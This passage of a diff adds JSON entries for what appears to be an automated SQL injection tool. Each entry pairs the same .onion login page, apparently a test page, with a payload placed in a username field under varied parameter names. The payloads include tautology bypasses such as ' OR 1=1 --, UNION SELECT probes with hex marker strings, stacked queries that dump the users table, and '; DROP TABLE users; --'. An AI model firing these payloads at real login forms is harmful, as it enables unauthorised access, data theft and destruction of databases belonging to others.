+                            "payload": {
+                                "user": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "' OR 1=1 -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "\" OR \"a\"=\"a\" -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "'; SELECT * FROM users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "UNION SELECT 1,2,3 --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "'; DROP TABLE users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "ORDER BY 1--",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "\" OR \"a\"=\"a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "' OR 'a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "' OR 1=1 -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "\" OR \"a\"=\"a\" -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "'; SELECT * FROM users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "'; DROP TABLE users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "UNION SELECT 1,2,3 --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "\" OR \"a\"=\"a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "ORDER BY 1--",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "' OR 1=1 -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "' OR 'a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "\" OR \"a\"=\"a\" -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "'; SELECT * FROM users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "'; DROP TABLE users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "UNION SELECT 1,2,3 --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "ORDER BY 1--",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "' OR 'a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "' OR 1=1 -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "\" OR \"a\"=\"a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "\" OR \"a\"=\"a\" -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "'; DROP TABLE users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "'; SELECT * FROM users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "UNION SELECT 1,2,3 --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "' OR 'a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "' OR 1=1 -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "ORDER BY 1--",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "\" OR \"a\"=\"a\" -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "\" OR \"a\"=\"a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "'; DROP TABLE users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "'; SELECT * FROM users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "UNION SELECT 1,2,3 --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "' OR 'a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "' OR 1=1 -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "\" OR \"a\"=\"a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "ORDER BY 1--",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "\" OR \"a\"=\"a\" -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "'; SELECT * FROM users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "'; DROP TABLE users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "' OR 'a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "' OR 1=1 -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "ORDER BY 1--",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usr": "UNION SELECT 1,2,3 --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "\" OR \"a\"=\"a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "\" OR \"a\"=\"a\" -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "'; DROP TABLE users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "ORDER BY 1--",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "'; SELECT * FROM users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "' OR 'a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "UNION SELECT 1,2,3 --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "' OR 1=1 -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "\" OR \"a\"=\"a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "\" OR \"a\"=\"a\" -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "'; DROP TABLE users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "ORDER BY 1--",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "' OR 1=1 -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "'; SELECT * FROM users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "UNION SELECT 1,2,3 --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "\" OR \"a\"=\"a\" -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "' OR 'a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "\" OR \"a\"=\"a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "UNION SELECT 1,2,3 --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "'; SELECT * FROM users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "'; DROP TABLE users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "ORDER BY 1--",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "' OR 1=1 -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "' OR 'a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "\" OR \"a\"=\"a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "\" OR \"a\"=\"a\" -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "'; SELECT * FROM users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "'; DROP TABLE users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "name": "UNION SELECT 1,2,3 --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
